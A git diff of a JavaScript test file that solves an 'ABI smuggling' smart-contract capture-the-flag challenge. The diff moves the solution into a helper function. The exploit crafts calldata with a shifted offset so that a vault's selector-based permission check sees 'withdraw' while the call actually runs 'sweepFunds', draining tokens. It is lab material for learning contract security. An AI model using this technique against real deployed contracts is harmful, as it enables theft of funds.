@@ -57,41 +57,44 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR  HERE */
-        const { hexZeroPad, hexConcat } = ethers.utils
-        //get function selector
-        const executeFn = vault.interface.getFunction('execute')
-        const executeFnSelector = vault.interface.getSighash(executeFn)
-        const withdrawFn = vault.interface.getFunction('withdraw')
-        const withdrawFnSelctor = vault.interface.getSighash(withdrawFn)
+        async function attackWithScript() {
+            const { hexZeroPad, hexConcat } = ethers.utils
+            //get function selector
+            const executeFn = vault.interface.getFunction('execute')
+            const executeFnSelector = vault.interface.getSighash(executeFn)
+            const withdrawFn = vault.interface.getFunction('withdraw')
+            const withdrawFnSelctor = vault.interface.getSighash(withdrawFn)
 
-        const target = hexZeroPad(vault.address, 32)
+            const target = hexZeroPad(vault.address, 32)
 
-        //change offset from 0x40 to 0x64
-        const exploitOffset = hexZeroPad(0x64, 32)
-        //fill position 0x40 with 32bytes nops and 4bytes withdrawFnSelctor
-        const nops = hexZeroPad(0x0, 32)
-        //data size 4+32+32
-        const expoitSize = hexZeroPad(0x44, 32)
-        const expoitData = vault.interface.encodeFunctionData('sweepFunds', [
-            recovery.address,
-            token.address
-        ])
+            //change offset from 0x40 to 0x64
+            const exploitOffset = hexZeroPad(0x64, 32)
+            //fill position 0x40 with 32bytes nops and 4bytes withdrawFnSelctor
+            const nops = hexZeroPad(0x0, 32)
+            //data size 4+32+32
+            const expoitSize = hexZeroPad(0x44, 32)
+            const expoitData = vault.interface.encodeFunctionData('sweepFunds', [
+                recovery.address,
+                token.address
+            ])
 
-        const actionData = hexConcat([
-            exploitOffset, //position 0x20 32bytes
-            nops, //postion 0x40 32bytes
-            withdrawFnSelctor, //position 0x60 4bytes
-            expoitSize, //postion 0x64 32bytes
-            expoitData
-        ])
-        const inputData = hexConcat([executeFnSelector, target, actionData])
+            const actionData = hexConcat([
+                exploitOffset, //position 0x20 32bytes
+                nops, //postion 0x40 32bytes
+                withdrawFnSelctor, //position 0x60 4bytes
+                expoitSize, //postion 0x64 32bytes
+                expoitData
+            ])
+            const inputData = hexConcat([executeFnSelector, target, actionData])
 
-        const tx = {
-            to: vault.address,
-            data: inputData
+            const tx = {
+                to: vault.address,
+                data: inputData
+            }
+
+            await player.sendTransaction(tx)
         }
-
-        await player.sendTransaction(tx)
+        await attackWithScript()
     })
 
     after(async function () {
